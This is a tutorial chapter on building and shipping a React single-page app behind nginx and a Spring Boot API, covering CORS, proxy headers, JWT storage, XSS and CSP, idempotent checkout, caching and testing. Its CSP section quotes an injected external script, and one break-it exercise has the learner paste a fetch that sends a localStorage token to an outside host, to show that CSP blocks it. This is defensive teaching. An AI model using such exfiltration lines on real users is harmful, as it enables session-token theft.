# Frontend level: a React app in front of the API

Goal: understand what changes when the client is a **browser** you do not control, and be able to answer the frontend half of a full-stack interview: "Where do you keep the token?", "Do you need CORS here?", "What happens when the user double-clicks Pay?", "How do you ship a single-page app?"

Read Levels 2, 3 and 5 first: JWT login, idempotency keys and rate limiting all reappear here, seen from the other side.

Versions: React 19.3, React Router 8.4, Vite 8.3, TypeScript 7.0, Vitest 5.0 with Testing Library, Node 22 (build only), nginx 1.30.

---

## 1. The picture

```
 browser  ── https://shop.example.com ──>  Ingress (TLS)
                                              |
                                  Service "shop-frontend"
                                              |
                              nginx pods (static files + reverse proxy)
                               |  /, /orders, /products/7 ...  -> index.html (React takes over)
                               |  /assets/index-3f9a1c.js      -> cached for a year
                               |  /api/...                     -> Service "shop" (Spring Boot)
                               |  /actuator/...                -> NOT proxied: 404
```

One origin for the browser. The page and the API both come from `https://shop.example.com`, so the browser never makes a cross-origin request. That one decision removes CORS from the normal path, keeps the API's admin endpoints off the internet, and lets the same image run anywhere.

In development the same idea holds, with Vite in nginx's place: the browser talks to `http://localhost:5173`, Vite forwards `/api` to Spring Boot on `:8080`.

---

## 2. What is new in the repo

```
frontend/
  src/api/client.ts        fetch wrapper: token, JSON, timeout, problem details -> ApiError
  src/api/shop.ts          one typed function per endpoint
  src/api/retry.ts         EXERCISE Part B (a stub)
  src/auth/ShopContext.tsx the session: token in memory, expiry timer, logout on 401
  src/cart/CartContext.tsx the cart (client-side state only)
  src/pages/*.tsx          products (load more), product, login, register, cart, orders, notifications
  src/components/ErrorMessage.tsx   turns any error into a sentence + a trace id for support
  src/test/                fakeApi (a stand-in server), renderApp, shared checkout steps
  src/exercises/           the exercise tests (excluded from npm test)
  nginx/                   reverse proxy config + security headers
  Dockerfile               Node builds, nginx serves; the final image has no Node
deploy/k8s/frontend.yaml   Deployment + Service shop-frontend
deploy/k8s/ingress.yaml    TLS for shop.example.com -> shop-frontend
```

Backend changes for this level:
- `SecurityConfig` has an explicit, deny-by-default **CORS** policy (`app.cors.allowed-origins`, empty unless you set `CORS_ALLOWED_ORIGINS`). Tested in `CorsTest`.
- The prod profile sets `server.forward-headers-strategy=native`, so Spring sees the real client address, protocol and port behind a proxy (section 4.3).

---

## 3. The browser is a different kind of client

A mobile app or another service is code you ship and control. A browser runs your code, but:
- **Anyone can read it.** Everything in `dist/` is public. No secrets in frontend code, ever: no API keys that matter, no "admin mode" flags. Every rule the frontend enforces (max quantity, hiding the admin menu) is a convenience; the API enforces the real one.
- **It runs on bad networks.** Requests time out, connections drop halfway, users click twice, go into a tunnel, come back. `client.ts` gives every request a 10 s timeout (`AbortController`) and turns "no answer" into a `NetworkError` with a human message.
- **It runs other people's code.** Browser extensions, analytics scripts, and every npm package you bundle run with the same rights as your code. This is why token storage and CSP matter (section 5).
- **The user is the retry loop.** When something fails, the person presses the button again. The UI decides whether that second press is safe (section 6.2).

What a single-page app is: the server sends one HTML file and a JavaScript bundle; from then on React draws every page and the router changes the URL without reloading. Consequence for the server: `/orders` is not a file, so nginx must answer unknown paths with `index.html` (the "SPA fallback").

---

## 4. Same origin, CORS, and the two 403s this level hit

### 4.1 Origins and CORS in one page

An **origin** is scheme + host + port: `https://shop.example.com:443`. The browser's same-origin policy lets a page READ responses only from its own origin. CORS is how a server says "this other origin may read my responses too".

- A "simple" cross-origin GET is sent, but the page can read the response only if it carries `Access-Control-Allow-Origin` with the page's origin.
- Anything else (JSON body, an `Authorization` header, `Idempotency-Key`) first triggers a **preflight**: an `OPTIONS` request asking "may I send POST with these headers?". The real request goes only if the answer allows it. `Access-Control-Max-Age` lets the browser cache that answer (1 hour here) instead of paying an extra round trip every time.
- Response headers are hidden from cross-origin JavaScript unless listed in `Access-Control-Expose-Headers`. That is why the CORS config exposes `ETag`, `Location`, `Retry-After`, `X-Trace-Id` and `Idempotent-Replayed`: without it, the UI could not show a countdown or a trace id.
- CORS protects **users' browsers**, not your server. `curl` ignores it. It is not authentication.

**Our choice: avoid CORS by serving everything from one origin**, and keep a tested, deny-by-default policy for the cases that need it (a separate admin app on another domain, a partner site). `CorsTest` checks: allowed origin gets the headers, an unknown origin and an unknown header get 403, no `Origin` means no CORS headers.

### 4.2 403 number one: the dev proxy rewrote Host

The first real-browser run of the app failed on register with 403, while every unit test passed. Browsers send an `Origin` header on every POST, even same-origin ones. Spring compares `Origin` with the request's own scheme, host and port; if they differ, the request is cross-origin, and with no allowed origins configured, CORS refuses it.

Vite's short form `'/api': 'http://localhost:8080'` rewrites `Host` to `localhost:8080`. Spring saw `Origin: http://localhost:5173` arriving at `localhost:8080`, so to Spring it was cross-origin. Fix: `changeOrigin: false` keeps the browser's `Host` (see the comment in `vite.config.ts`).

Lesson: tests with a fake `fetch` cannot find this class of bug. Only a real browser through the real proxy can.

### 4.3 403 number two: the production proxy lost the port

Same symptom, in CI this time: the smoke test (section 7.4) registers a user **through nginx** with `Origin: http://localhost:8081`, and got 403.

In production Spring runs behind proxies, so `server.forward-headers-strategy=native` makes Tomcat rebuild the request's scheme, host, port and client IP from `X-Forwarded-*` headers (trusted only from private-network addresses). nginx sent `Host: localhost:8081` and `X-Forwarded-Proto: http`, but no `X-Forwarded-Port`. Given only a protocol, Tomcat assumes that protocol's default port: 80. The request now "came to" `http://localhost:80`, which is not the page's origin.

The same bug would hit real users behind the TLS Ingress: nginx sent `X-Forwarded-Proto: $scheme`, which is `http` (the Ingress talks plain HTTP to nginx), while the page is `https://...`.

The fix in `nginx/default.conf.template`: keep what an outer proxy already said, otherwise describe this connection.

```
map $http_x_forwarded_proto $client_proto { default $http_x_forwarded_proto; "" $scheme; }
...  X-Forwarded-Port: the Ingress's value, else the port in Host, else 443 for https, else 80
```

Checked against the real backend in the prod profile before pushing: same-origin POST 201, evil origin 403, "Ingress" with `https` 201, no `Origin` (curl) 201.

**Why not just turn off the Origin check?** Because it is part of the defence. With token auth in an `Authorization` header, CSRF is not the risk (a forged cross-site request cannot attach the header), but the moment someone adds cookie auth, the origin check is what stops other sites from posting as the user. Fix the proxy, keep the check.

---

## 5. Tokens in the browser, XSS and CSP

### 5.1 Where to keep the JWT

| Where | Survives reload | Readable by injected script | CSRF risk | Notes |
|---|---|---|---|---|
| Memory (React state) | No | Only while the tab is open | No | **This app.** Reload = log in again. |
| `localStorage` | Yes | Yes, and it can be sent away and used for hours | No | Common in tutorials. One XSS bug leaks every token. |
| `HttpOnly` cookie | Yes | No | Yes, so add `SameSite` + CSRF protection | The production answer, usually for a **refresh** token. |

The production pattern: short-lived access token (minutes) in memory; long-lived refresh token in an `HttpOnly; Secure; SameSite=Strict` cookie scoped to `/api/v1/auth/refresh`. On page load the app calls refresh to get a new access token. Script can never read the refresh token, and the access token dies quickly. The backend in this repo does not issue refresh tokens; adding them is a stretch exercise.

What the app does with the token (`ShopContext.tsx`):
- reads the claims (email, role, expiry) **for display only** (`jwt.ts`). The browser cannot verify the signature, and does not need to: the server checks every request;
- logs out when the token expires (a timer), and when any request that carried a token gets 401 ("Your session has ended"), and returns the user to the page they were on after login.

### 5.2 XSS and Content-Security-Policy

Cross-site scripting: an attacker's script runs inside your page, with your user's session. React escapes everything you render with `{value}`, so the classic hole is closed by default; the remaining risks are `dangerouslySetInnerHTML`, `href={userInput}` (`javascript:` URLs) and third-party scripts.

CSP is the second line: a header that tells the browser which sources may run. Ours (`nginx/security-headers.conf`) allows scripts, styles and connections only from `'self'`, no inline scripts, no `eval`, no plugins, and no framing (`frame-ancestors 'none'` stops clickjacking). Even if an attacker injects `<script src="https://evil.example/x.js">` or `<img onerror=...>`, the browser refuses to run it, and `connect-src 'self'` stops a script from sending a stolen token elsewhere with `fetch`. Vite's production build needs no inline script, which is why a strict CSP is possible.

Also sent: `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, a `Permissions-Policy` that turns off camera, microphone and location, and `Cross-Origin-Opener-Policy: same-origin`.

---

## 6. Using a production API from the UI

Everything the backend levels built has a UI side.

### 6.1 Errors people can act on (Level 1, Level 6)

The API returns RFC 9457 problem details with a `traceId`. `client.ts` turns any non-2xx answer into an `ApiError` (status, detail, field errors, trace id, `Retry-After`); `ErrorMessage.tsx` turns that into a sentence:
- 400 with field errors: shown next to each field (`aria-invalid`, `aria-describedby`);
- 404: "This product does not exist.";
- 429: "Too many requests. Please wait 30 seconds and try again.";
- 5xx: a generic sentence. Never show stack traces or SQL;
- every error box shows **"Reference for support: 0af7651916cd43dd..."**. A support ticket with that id leads straight to the trace and the log lines (Level 6, section 3.1).

### 6.2 The double click and the lost answer (Level 3)

`CartPage.tsx` creates one `Idempotency-Key` per purchase attempt, when the customer first presses "Place order":
- the button is disabled while the request is in flight, so a double click sends one request;
- after an error or a timeout, pressing again reuses the same key. If the first request did reach the server, the server returns that order instead of creating a second one (`Idempotent-Replayed: true`);
- changing the cart creates a new key, because that is a different purchase. A 422 (key reused for a different body) also resets it.

The case that matters most is the timeout. The browser cannot tell "the server never got it" from "the server did it, and the answer was lost". Only the idempotency key makes "just try again" safe.

### 6.3 Eventual consistency in the UI (Level 5)

Notifications are written by the outbox worker a moment after the order. The notifications page polls every 5 s, and announces new items to screen readers with `aria-live="polite"`. Polling is the simplest thing that works; section 9 covers when to use server-sent events or WebSockets instead.

### 6.4 Lists (Level 4)

Products use the **cursor** endpoint with a "Load more" button: each page asks for "the next 12 after this cursor", so new products never shift the list and deep pages cost the same as the first. Orders use offset pages (Newer/Older), which is fine for one user's short history.

### 6.5 Accessibility is part of "production"

Real labels on every input, buttons that are `<button>`s, errors in `role="alert"`, status messages in `role="status"`, and a quantity field that validates on submit instead of fighting the user on every key press (a real bug this level fixed: the first version clamped the value on every key press, so you could not clear the field and type a new number). Testing Library queries by role and label, so tests fail when the page is not accessible.

---

## 7. Shipping it

### 7.1 Build output and caching

`npm run build` type-checks, then writes `dist/index.html` and hashed files like `dist/assets/index-DOKU9p6G.js` (273 kB, **86 kB gzipped**, nearly all of it React and the router).
- `/assets/*`: `Cache-Control: public, max-age=31536000, immutable`. The name changes when the content does, so browsers and CDNs can keep these forever.
- `index.html`: `Cache-Control: no-cache` (store it, but ask every time). It is small and it names the current bundle; caching it would keep users on an old version after a deploy.

That pair is the whole "cache busting" strategy, and it is what a CDN in front would rely on too.

### 7.2 The image

Multi-stage `Dockerfile`: Node 22 runs `npm ci` and `npm run build`; the final stage is `nginx-unprivileged` with only the built files, the config template and the headers snippet. No Node, no source, no `node_modules` in production, and nginx runs as a non-root user on 8080. `API_UPSTREAM` is filled in at container start, so one image works in CI (`http://smoke-app:8080`) and in Kubernetes (`http://shop:80`).

### 7.3 Kubernetes

`deploy/k8s/frontend.yaml`: 2 replicas, non-root, no privilege escalation and all Linux capabilities dropped, readiness and liveness probes on `/`, and tiny requests (50m CPU, 32Mi memory: it is a static file server). `deploy/k8s/ingress.yaml` terminates TLS for `shop.example.com` and sends everything to `shop-frontend`; nginx decides what reaches the API. The Spring Boot Service is not exposed by the Ingress at all. HSTS belongs here too, where HTTPS ends, not in nginx.

### 7.4 The full-stack smoke test in CI

After building the backend image, CI builds the frontend image, runs it in front of the backend (prod profile, real PostgreSQL), and checks with curl:
- `/` and an app route (`/products/1`) return the app (SPA fallback);
- CSP and `no-cache` on the HTML, `immutable` on a real asset from the page;
- `/api/v1/ping` works through the proxy;
- a **browser-style POST with an `Origin` header** returns 201 (this caught section 4.3);
- `/actuator/prometheus` is not reachable through the frontend.

---

## 8. Testing a frontend

- **Unit tests for logic** (`client.test.ts`, `jwt.test.ts`): plain functions, a fake `fetch`.
- **Page tests** (`pages/*.test.tsx`): render the real app with `MemoryRouter` and a fake API (`test/fakeApi.ts`). The tests click and type like a user (`user-event`), find elements by role and label, and check both what the user sees and what was **sent** (the `Idempotency-Key` header, the request body). An unexpected request fails the test, so the tests also document exactly which calls each page makes.
- **Fake timers** for anything time-based (polling, countdowns): `vi.useFakeTimers()` and `advanceTimersByTimeAsync`, so a 30 s countdown test takes milliseconds.
- **What fakes cannot find**: the proxy and header bugs in section 4. They need a real browser or at least real HTTP through the real proxy. The CI smoke test covers the HTTP part. A Playwright suite against the running stack is the next step (stretch exercise).

```
cd frontend
npm ci
npm test                 # 33 tests
npm run typecheck
npm run build
```

---

## 9. Run it yourself

```
docker compose up -d db
./mvnw spring-boot:run                       # API on :8080
cd frontend && npm ci && npm run dev         # app on http://localhost:5173
```

Register, log in, add a mug to the cart, place an order, watch the notification appear within 5 seconds. Open the browser's dev tools, Network tab: every request goes to `localhost:5173`, none to `:8080`.

To try the production image locally (with Docker):
```
docker build -t shop-frontend:local frontend
docker run --rm -p 8081:8080 -e API_UPSTREAM=http://host.docker.internal:8080 shop-frontend:local
```

**Break it on purpose:**
1. Change the Vite proxy to the short form `'/api': 'http://localhost:8080'` and register in the browser. Read the 403 in the Network tab, then explain it from section 4.2.
2. Remove the `X-Forwarded-Port` line from the nginx template and work out what Tomcat now thinks the request URL is.
3. Store the token in `localStorage`, then paste `fetch('https://example.com/?t=' + localStorage.token)` into the console. Now try the same on the nginx image: which CSP directive stops it?
4. Delete `Retry-After` from the CORS exposed headers and call the API from another origin. What does `response.headers.get('Retry-After')` return?
5. Make `CartPage` create a new `Idempotency-Key` on every click and run its tests. Which test catches it, and what would a customer see?

---

## 10. Exercise: be a good citizen when the server says "not now"

Run with `cd frontend && npm run test:exercises`. The tests are in `frontend/src/exercises/`; do not edit them.

**Part A: a countdown after 429.** Level 5 rate-limits orders and answers `429` with `Retry-After`. Right now the cart just shows an error and the customer keeps clicking. Change `CartPage.tsx` so that after a 429:
- the button reads **"Try again in 30 s"** (counting down every second) and is disabled;
- when the time is up it reads "Place order" again and works;
- the retry uses the **same** `Idempotency-Key` (the refused attempt never ran);
- with no `Retry-After` header, wait 5 seconds;
- other errors (409, 500...) do not start a countdown.

Hints: keep "when the wait ends" in state (a timestamp, not a counter), tick a `now` state with `setInterval` while waiting, and clear the interval in the effect's cleanup. `Math.ceil` gives the seconds to show.

**Part B: automatic retries for transient failures.** Write `retrying(task, { attempts = 3, baseDelayMs = 250, sleep })` in `src/api/retry.ts`, then use it for `placeOrder` in the cart:
- retry only failures that may succeed if repeated: `NetworkError` (no answer), `502`, `503`, `504`;
- never retry `4xx`, including `429` (Part A handles that with the user in the loop);
- wait `Retry-After` when the server gives it, else exponential backoff: `baseDelayMs`, then 2x, 4x...;
- after the last attempt, throw the last error.

The last test makes the first `fetch` throw `TypeError: Failed to fetch` and checks the order is placed without a second click, with one key. Why is this safe for `POST /orders` and would be dangerous for a payment API without idempotency keys?

Done when `npm run test:exercises` passes and `npm test` and `npm run build` still pass. (Some cart tests answer `500`, not `503`, exactly so they still mean "show an error" once your retry exists.)

**Read first** (search the page title if a link has moved):
- MDN, Cross-Origin Resource Sharing (CORS): https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS
- MDN, Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP
- MDN, `Retry-After`: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Retry-After
- React, "Synchronizing with Effects" (intervals and cleanup): https://react.dev/learn/synchronizing-with-effects
- React, "You Might Not Need an Effect": https://react.dev/learn/you-might-not-need-an-effect
- Testing Library, "Which query should I use?": https://testing-library.com/docs/queries/about/#priority
- Vitest, fake timers: https://vitest.dev/guide/mocking/timers
- AWS Architecture Blog, "Exponential Backoff And Jitter": https://aws.amazon.com/blogs/architecture/exponential-backoff-and-jitter/
- OWASP, HTML5 Security Cheat Sheet (local storage): https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html

**Answer in your own words:**
1. Why is 429 not retried automatically, while 503 is?
2. 10,000 browsers lose the connection at the same moment and all retry after exactly 250, 500, 1000 ms. What happens to the server, and what does jitter change?
3. Why a timestamp in state, not "seconds left" decremented by the interval? (Hint: background tabs throttle timers.)
4. Should `GET /products` be retried the same way? `POST /auth/register`?

**Stretch (no tests):**
- Add full jitter to `retrying` (a random delay between 0 and the backoff) and change the test to inject the random function.
- Refresh tokens: an `HttpOnly` cookie endpoint on the backend, a silent refresh on page load, and CSRF protection for that one endpoint.
- A Playwright test that runs the real stack (backend, nginx image, Chromium) through register, order and notification.
- Replace notification polling with server-sent events. What changes for nginx (buffering, timeouts) and for the Ingress?

Reference solution: `solutions/level-fe/` (`frontend/src/api/retry.ts`, `frontend/src/pages/CartPage.tsx`). Compare after you try.

---

## 11. The scaling lens (frontend)

- **Static files scale for free.** Put a CDN in front: hashed assets are cached at the edge forever, `index.html` is revalidated. The nginx pods then mostly proxy the API. Many teams host the static files on object storage plus a CDN and route `/api` at the CDN or load balancer instead.
- **The API sees browser behaviour at scale.** 100,000 open tabs polling every 5 s is 20,000 requests per second to `/notifications` before anyone buys anything. At that point: longer intervals, polling only while the tab is visible (`document.visibilityState`), conditional requests (ETags from Level 4), or a push channel (server-sent events or WebSockets) through a service built for many idle connections.
- **Retries multiply load.** A retry policy that is fine for one user can turn a brief outage into a storm. Backoff, jitter, a retry budget, and honouring `Retry-After` keep clients from making an outage worse.
- **Large companies** split the frontend by team (micro-frontends or a monorepo with strict ownership), render the first page on the server for speed and SEO (Next.js and similar), put a "backend for frontend" between the browser and many services, and measure real users' load times (Core Web Vitals), not just server latency.

---

## 12. Interview talk track

"The frontend is a React and TypeScript single-page app built with Vite and served by nginx from the same origin as the API, so the browser never makes a cross-origin request: no CORS on the normal path, and actuator is not reachable from outside. The backend still has an explicit deny-by-default CORS policy for other origins, with the headers the UI needs exposed. The JWT lives only in memory. That is a trade-off against XSS: localStorage would survive reloads but lets any injected script steal a long-lived token. In production I'd add a short-lived access token plus an HttpOnly refresh cookie. A strict CSP with no inline scripts is the second line of defence. On the API side, checkout creates one idempotency key per purchase attempt and reuses it for retries, so a double click or a lost answer never creates two orders. Errors are problem details, and the UI shows a trace id that support can look up. After a 429 the UI counts down `Retry-After`, and network errors and 503s are retried with backoff. Hashed assets are cached for a year and index.html is revalidated. CI tests the pages against a fake API, then smoke-tests the real nginx image in front of the real backend with a browser-style Origin header. That smoke test caught a proxy bug that would have broken every POST behind the TLS ingress."

**Questions you should now be able to answer:**
1. What is an origin? When does a browser send a CORS preflight, and what does `Access-Control-Max-Age` save?
2. Why does serving the SPA and the API from one origin remove the need for CORS? What else does it give you?
3. Why does CORS not protect your API from curl or a script? What does it protect?
4. Memory vs localStorage vs HttpOnly cookie for tokens: what are the trade-offs, and what changes about CSRF?
5. What is XSS? How does React reduce it, where can it still happen, and what does CSP add?
6. A user double-clicks "Pay", or the response is lost. Walk through what your UI and API do.
7. Which errors should a client retry automatically, and how? What are backoff and jitter for?
8. How do you cache a single-page app so users get new versions immediately but assets load from cache?
9. What do `X-Forwarded-Proto`, `X-Forwarded-Port` and `X-Forwarded-For` do, and why must the backend trust them only from known proxies?
10. How do you test a React page? What can tests with a fake API never find?
11. Polling vs server-sent events vs WebSockets: when would you switch, and what does each cost the backend?
